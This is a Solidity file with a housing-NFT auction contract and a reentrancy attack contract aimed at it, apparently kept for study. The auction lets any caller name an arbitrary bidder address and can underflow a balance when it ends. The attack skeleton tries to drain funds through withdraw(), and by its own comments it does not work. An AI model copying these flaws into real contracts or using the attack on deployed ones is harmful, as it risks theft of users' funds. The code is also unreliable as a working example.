pragma solidity >=0.4.22 < 0.6.11;

import "./BaseLogic.sol";

contract HousingAuction {
    // AuctionEnd isn't working properly
    address deployer; // Us, the protocol through the Market contract.
    address seller; // seller would be the address getting payed, hence the payable, of the NFT/home.
    address payable public buyer; // This is the buyer(previous beneficiary)
    
    // Current state of the auction.
    address public highestBidder; // self-explanatory
    uint public highestBid; // self-explanatory

    // Allowed withdrawals of previous bids
    mapping(address => uint) pendingReturns; 

    // Set to true at the end, disallows any change and is set externally.
    bool public ended;

    // Events that will be emitted on changes.
    event HighestBidIncreased(address bidder, uint amount);
    event AuctionEnded(address winner, uint amount); // Examples to refer to when we get a higherbid & end the auction.
    
    // Setting up the constructor so the winner buyer can receive their new house
    constructor(address payable _buyer) public {
        deployer = msg.sender;
        buyer = _buyer;
    }

    // Bid on the auction with the value sent together with this transaction.
    // The value will only be refunded if the auction is not won.
    function bid(address payable sender) public payable { 

        require(msg.value > highestBid); // Makes sure to know whether there's a higher bid or not.

        require(!ended); // auctionEnd has already been called, IT'S OVER!

        if (highestBid != 0) { // highestBid can't be 0.
            pendingReturns[highestBidder] += highestBid;
        }
        highestBidder = sender;
        highestBid = msg.value;
        emit HighestBidIncreased(sender, msg.value); // emit allows for visualization of the information in Line 44
    }
    // For those who were outbid
    function withdraw() public returns (bool) { 
        uint amount = pendingReturns[msg.sender];
        if (amount > 0) {
            pendingReturns[msg.sender] = 0;
            // Line 53 searches how much to issue back to the address making the request to recieve their previous bid money back.
            if (!msg.sender.send(amount)) {
                pendingReturns[msg.sender] = amount;
                return false;
            }
        }
        return true;
    }

    function pendingReturn(address sender) public view returns (uint) { 
        return pendingReturns[sender];
    }

    /// End the auction and send the highest bid
    /// to the beneficiary.
    function auctionEnd() public { 
        // 1. Conditions
        require(!ended);
        require(msg.sender == deployer); // Not the auction deployer? Then no access... 

        // 2. Effects
        ended = true;
        emit AuctionEnded(highestBidder, highestBid);
        pendingReturns[highestBidder] = pendingReturns[highestBidder] - (highestBid); 
        // 3. Interaction
        buyer.transfer(highestBid); 
    }
}

contract Reentrancy {
    HousingAuction public housingauction; // State variable that represents the auction contract
    
    constructor(address _auctionaddress) public {
        // Target locked
        housingauction = HousingAuction(_auctionaddress);
    }

    function fallback() external payable {
        // To halt the attack
        if (address(housingauction).balance >= 3 ether) {
            housingauction.withdraw(); // Doesn't work like intended but the skeleton is here for studying and a potential fix *
        }
    }
    
    function attack() external payable {
        require(msg.value >= 3 ether); // Requirement for amount to have in order to continue the attack (in wei).
        // bid function asks for address that will send wei
        housingauction.bid(0x5eE6f92c8872f7b4f5974754A0c7c3596e2F2161);
        // Now, withdraw the funds. In doing so, the fallback() function will be triggered
        housingauction.withdraw(); // Doesn't work like intended but the skeleton is here for studying and a potential fix *
    }
}